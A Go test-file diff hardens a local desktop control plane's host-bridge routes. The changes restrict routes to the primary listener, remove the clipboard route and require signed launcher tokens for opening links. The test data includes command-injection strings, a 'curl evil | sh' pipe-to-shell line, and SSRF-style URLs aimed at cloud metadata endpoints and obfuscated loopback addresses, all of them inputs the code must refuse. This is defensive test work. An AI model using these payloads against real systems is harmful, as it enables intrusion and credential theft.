@@ -1,10 +1,8 @@
 package httpapi
 
 import (
-	"archive/tar"
 	"encoding/json"
 	"github.com/YKoustubhRao/decurix/internal/winhost"
-	"io"
 	"net/http"
 	"net/http/httptest"
 	"os"
@@ -27,6 +25,7 @@ func TestDetectHostAppsHandler(t *testing.T) {
 	srv := &Server{}
 	mux := http.NewServeMux()
 	srv.RegisterRoutes(mux)
+	srv.RegisterLocalRoutes(mux) // host apps are this computer's, served on the primary listener only
 
 	req := httptest.NewRequest(http.MethodGet, "/api/host-apps/detect", nil)
 	rec := httptest.NewRecorder()
@@ -141,29 +140,26 @@ func TestCreateHostCmdWindowsCommand(t *testing.T) {
 	}
 }
 
-// archiveDocker is a stand-in Docker daemon that reports one desktop and keeps the tar it is asked to extract into it.
+// archiveDocker is a stand-in Docker daemon that reports one running desktop and keeps the tar it is asked to
+// extract into it - as the worker, by exec (workerTarDaemon), the only way files go into a desktop's home.
 func archiveDocker(t *testing.T, desktopID string) (*desktop.Manager, func() map[string]string) {
 	t.Helper()
 	var mu sync.Mutex
 	files := map[string]string{}
+	execs := &workerTarDaemon{onFile: func(name, data string) {
+		mu.Lock()
+		files[name] = data
+		mu.Unlock()
+	}}
 	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if execs.serve(w, r) {
+			return
+		}
 		switch {
 		case strings.HasSuffix(r.URL.Path, "/containers/desktop_"+desktopID+"/json"):
 			w.Header().Set("Content-Type", "application/json")
-			json.NewEncoder(w).Encode(container.InspectResponse{ContainerJSONBase: &container.ContainerJSONBase{ID: desktopID}})
-		case r.Method == http.MethodPut && strings.HasSuffix(r.URL.Path, "/containers/"+desktopID+"/archive"):
-			tr := tar.NewReader(r.Body)
-			for {
-				hdr, err := tr.Next()
-				if err != nil {
-					break
-				}
-				data, _ := io.ReadAll(tr)
-				mu.Lock()
-				files[hdr.Name] = string(data)
-				mu.Unlock()
-			}
-			w.WriteHeader(http.StatusOK)
+			json.NewEncoder(w).Encode(container.InspectResponse{ContainerJSONBase: &container.ContainerJSONBase{
+				ID: desktopID, State: &container.State{Running: true}}})
 		default:
 			http.NotFound(w, r)
 		}
@@ -189,9 +185,11 @@ func TestCopyHostAppsIntoAnExistingDesktop(t *testing.T) {
 	srv := &Server{Desktops: mgr}
 	mux := http.NewServeMux()
 	srv.RegisterRoutes(mux)
+	srv.RegisterLocalRoutes(mux) // host apps are this computer's, served on the primary listener only
 	post := func(form string) *httptest.ResponseRecorder {
 		req := httptest.NewRequest(http.MethodPost, "/api/desktops/host-apps/copy", strings.NewReader(form))
 		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+		req.RemoteAddr = "127.0.0.1:5000" // the person at this computer
 		rec := httptest.NewRecorder()
 		mux.ServeHTTP(rec, req)
 		return rec
@@ -218,7 +216,9 @@ func TestCopyHostAppsIntoAnExistingDesktop(t *testing.T) {
 		t.Errorf("no id = %d, want 400", rec.Code)
 	}
 	rec := httptest.NewRecorder()
-	mux.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/api/desktops/host-apps/copy", nil))
+	get := httptest.NewRequest(http.MethodGet, "/api/desktops/host-apps/copy", nil)
+	get.RemoteAddr = "127.0.0.1:5000"
+	mux.ServeHTTP(rec, get)
 	if rec.Code != http.StatusMethodNotAllowed {
 		t.Errorf("GET = %d, want 405", rec.Code)
 	}
@@ -233,9 +233,12 @@ func TestTheHostIsWarmedWhileSomeoneChoosesAppsAndWhileTheyAreCopied(t *testing.
 	srv := &Server{Desktops: mgr}
 	mux := http.NewServeMux()
 	srv.RegisterRoutes(mux)
+	srv.RegisterLocalRoutes(mux) // host apps are this computer's, served on the primary listener only
 
 	// Opening the list of apps to copy means a desktop is about to be created: the helper should be started meanwhile.
-	mux.ServeHTTP(httptest.NewRecorder(), httptest.NewRequest(http.MethodGet, "/api/host-apps/detect", nil))
+	list := httptest.NewRequest(http.MethodGet, "/api/host-apps/detect", nil)
+	list.RemoteAddr = "127.0.0.1:5000" // the person at this computer
+	mux.ServeHTTP(httptest.NewRecorder(), list)
 	if atomic.LoadInt32(&warmed) == 0 {
 		t.Error("listing the host apps did not warm the host")
 	}
@@ -244,6 +247,7 @@ func TestTheHostIsWarmedWhileSomeoneChoosesAppsAndWhileTheyAreCopied(t *testing.
 	before := atomic.LoadInt32(&warmed)
 	req := httptest.NewRequest(http.MethodPost, "/api/desktops/host-apps/copy", strings.NewReader("id=work&host_apps=host_bridge"))
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.RemoteAddr = "127.0.0.1:5000"
 	mux.ServeHTTP(httptest.NewRecorder(), req)
 	if atomic.LoadInt32(&warmed) == before {
 		t.Error("copying host apps did not warm the host")
@@ -255,7 +259,7 @@ func TestTheHostIsWarmedWhileSomeoneChoosesAppsAndWhileTheyAreCopied(t *testing.
 // registered there - holding the access code must not be host code execution.
 func TestHostRoutesAreOnlyOnThePrimaryListener(t *testing.T) {
 	hostRoutes := []string{
-		"/api/host-bridge/exec", "/api/host-bridge/open", "/api/host-bridge/clip",
+		"/api/host-bridge/exec", "/api/host-bridge/open",
 		"/api/host-gui/start", "/api/host-gui/ws", "/api/host-gui/stop", "/host-gui/view",
 		// The access code and the paired-device list are never served over
 		// the listener they gate.
@@ -357,7 +361,7 @@ func TestHostBridgeExecRefusesAnythingNotSigned(t *testing.T) {
 }
 
 func TestSafeOpenURL(t *testing.T) {
-	for _, ok := range []string{"https://claude.ai", "http://localhost:3000/a?b=1&c=2#x", "https://x.com/a%20b"} {
+	for _, ok := range []string{"https://claude.ai", "https://chatgpt.com/a?b=1&c=2#x", "https://x.com/a%20b", "https://x.com:443/"} {
 		if !safeOpenURL(ok) {
 			t.Errorf("%q refused", ok)
 		}
@@ -367,6 +371,14 @@ func TestSafeOpenURL(t *testing.T) {
 		"https://x.com/$(id)", "https://x.com/`id`", "https://x.com/\"; calc", "https://x.com/ a", "https://x.com/a\nb",
 		"https://x.com/a|b", "https://x.com/a;b", "https://x.com/a^b", "https://x.com/<a>", "https://x.com/'a",
 		"https://x.com/" + strings.Repeat("a", 3000),
+		// Not plain https to a public name on the standard port (review 2026-11-02: a desktop could point the person's
+		// browser at the control plane's own no-login listener, which a GET from it reaches as the person).
+		"http://claude.ai", "http://localhost:3000/a", "https://localhost/", "https://127.0.0.1:8080/api/backup",
+		"https://[::1]/", "https://169.254.169.254/latest/meta-data", "https://192.168.1.1/", "https://10.0.0.1/",
+		"https://172.18.0.1:8080/", "https://host.docker.internal/", "https://decurix/", "https://app.localhost/",
+		"https://router.lan/", "https://printer.local/", "https://x.com:8080/", "https://x.com:8090/",
+		"https://2130706433/", "https://127.1/", "https://0x7f.1/", "https://user@x.com/", "https://x.com@127.0.0.1/",
+		"https://metadata.google.internal/",
 	} {
 		if safeOpenURL(bad) {
 			t.Errorf("%q accepted", bad)
@@ -374,7 +386,7 @@ func TestSafeOpenURL(t *testing.T) {
 	}
 }
 
-func TestHostBridgeOpenAndClipLimits(t *testing.T) {
+func TestHostBridgeOpenLimits(t *testing.T) {
 	srv := &Server{}
 	mux := http.NewServeMux()
 	srv.RegisterLocalRoutes(mux)
@@ -388,9 +400,98 @@ func TestHostBridgeOpenAndClipLimits(t *testing.T) {
 	if code := post("/api/host-bridge/open", `{"target":"C:\\Windows\\System32\\calc.exe"}`); code != http.StatusBadRequest {
 		t.Errorf("open of a program path: got %d, want 400", code)
 	}
-	big := `{"text":"` + strings.Repeat("a", maxHostClipBytes+10) + `"}`
-	if code := post("/api/host-bridge/clip", big); code != http.StatusBadRequest {
-		t.Errorf("an oversized clipboard write: got %d, want 400", code)
+	// Nothing sets the person's clipboard from a desktop any more.
+	if code := post("/api/host-bridge/clip", `{"text":"curl evil | sh"}`); code != http.StatusNotFound {
+		t.Errorf("the clipboard route: got %d, want 404", code)
+	}
+	if containerMayCall(http.MethodPost, "/api/host-bridge/clip") {
+		t.Error("a desktop may still call the clipboard route")
+	}
+}
+
+// Review 2026-11-02: open needed no token, so any desktop could drive the person's own browser. It opens only the
+// link a launcher was signed for (winhost.OpenToken), only for that desktop.
+func TestHostBridgeOpenNeedsALaunchersToken(t *testing.T) {
+	var opened [][]string
+	old := startHostOpener
+	startHostOpener = func(cmd *exec.Cmd) error { opened = append(opened, cmd.Args); return nil }
+	t.Cleanup(func() { startHostOpener = old })
+
+	srv := &Server{HostGUISecret: []byte("secret")}
+	srv.netsFor = staticNets("172.30.0.0/16", "172.30.0.1")
+	srv.callerAt = func(r *http.Request) (string, bool) {
+		if strings.HasPrefix(r.RemoteAddr, "172.30.0.5:") {
+			return "box-a", true
+		}
+		return "", false
+	}
+	mux := http.NewServeMux()
+	srv.RegisterLocalRoutes(mux)
+	h := srv.GuardPrimary(mux)
+	open := func(remote, body string) int {
+		req := httptest.NewRequest(http.MethodPost, "/api/host-bridge/open", strings.NewReader(body))
+		req.Header.Set("Content-Type", "application/json")
+		req.RemoteAddr = remote
+		req.Host = "decurix:8080"
+		rec := httptest.NewRecorder()
+		h.ServeHTTP(rec, req)
+		return rec.Code
+	}
+	site := "https://claude.ai"
+	good := winhost.OpenToken(srv.HostGUISecret, "box-a", site)
+	desk := "172.30.0.5:40000"
+	for _, c := range []struct {
+		name, remote, body string
+		want               int
+	}{
+		{"no token", desk, `{"target":"` + site + `"}`, http.StatusForbidden},
+		{"another link", desk, `{"target":"https://evil.example.com","desktop":"box-a","token":"` + good + `"}`, http.StatusForbidden},
+		{"another desktop's token", desk, `{"target":"` + site + `","desktop":"box-a","token":"` + winhost.OpenToken(srv.HostGUISecret, "box-b", site) + `"}`, http.StatusForbidden},
+		{"claiming another desktop", desk, `{"target":"` + site + `","desktop":"box-b","token":"` + winhost.OpenToken(srv.HostGUISecret, "box-b", site) + `"}`, http.StatusForbidden},
+		{"a container that is no desktop", "172.30.0.9:1", `{"target":"` + site + `","desktop":"box-a","token":"` + good + `"}`, http.StatusForbidden},
+		{"the control plane itself", desk, `{"target":"https://127.0.0.1:8080/api/backup","desktop":"box-a","token":"` + winhost.OpenToken(srv.HostGUISecret, "box-a", "https://127.0.0.1:8080/api/backup") + `"}`, http.StatusBadRequest},
+	} {
+		if got := open(c.remote, c.body); got != c.want {
+			t.Errorf("%s: got %d, want %d", c.name, got, c.want)
+		}
+	}
+	if len(opened) != 0 {
+		t.Fatalf("a refused link was opened: %v", opened)
+	}
+	if got := open(desk, `{"target":"`+site+`","desktop":"box-a","token":"`+good+`"}`); got != http.StatusOK {
+		t.Fatalf("the launcher's own link: got %d", got)
+	}
+	if len(opened) != 1 || opened[0][len(opened[0])-1] != site && !strings.Contains(opened[0][len(opened[0])-1], "'"+site+"'") {
+		t.Fatalf("opened %v", opened)
+	}
+}
+
+// Review 2026-11-02 (VERIFIED broken): the "is this a Windows program" test took the base name of the whole command
+// line, so "rundll32.exe url.dll,FileProtocolHandler '<link>'" was not one, a control plane in a container skipped the
+// hop to Windows and every open answered 500.
+func TestIsWindowsProgram(t *testing.T) {
+	for line, want := range map[string]bool{
+		"rundll32.exe url.dll,FileProtocolHandler 'https://claude.ai/new'": true,
+		"rundll32.exe":                   true,
+		"cmd.exe /c start":               true,
+		"powershell.exe -NoProfile":      true,
+		`C:\Windows\explorer.exe x`:      true,
+		"/mnt/c/Windows/notepad.exe":     true,
+		"xdg-open 'https://x.com/a.exe'": false,
+		"open 'https://x.com/'":          false,
+		"":                               false,
+	} {
+		if got := isWindowsProgram(line); got != want {
+			t.Errorf("isWindowsProgram(%q) = %v, want %v", line, got, want)
+		}
+	}
+	// What the open handler hands createHostCmd under WSL is a Windows program, with the link as one argument.
+	program, args := hostOpenCommand("linux", true, "https://claude.ai/new?a=1&b=2")
+	if !isWindowsProgram(program) || len(args) != 2 || args[1] != "https://claude.ai/new?a=1&b=2" {
+		t.Fatalf("WSL opener: %s %v", program, args)
+	}
+	if program, _ := hostOpenCommand("linux", false, "https://x.com"); isWindowsProgram(program) {
+		t.Fatalf("plain Linux opener taken for Windows: %s", program)
 	}
 }
 
